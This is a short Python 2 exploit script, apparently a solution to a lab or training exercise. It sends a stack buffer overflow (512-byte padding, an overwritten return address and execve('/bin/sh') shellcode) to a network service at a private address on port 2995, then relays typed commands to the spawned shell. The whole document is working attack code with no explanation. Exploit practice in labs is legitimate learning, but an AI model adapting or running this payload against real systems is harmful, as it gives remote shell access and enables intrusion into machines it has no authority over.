import socket
import struct

ADDR = "192.168.1.70"
PORT = 2995

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ADDR, PORT))

message = "A"*512 + struct.pack("<B", 0x00) + "bbbbccccddddeeeefff" + struct.pack("<L", 0xbffff7b0) + "\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80" + "\n"

s.send(message)
s.send("whoami\n")
print s.recv(1024)
while True:
	command = raw_input() + "\n"
	s.send(command)
	print(s.recv(1024))
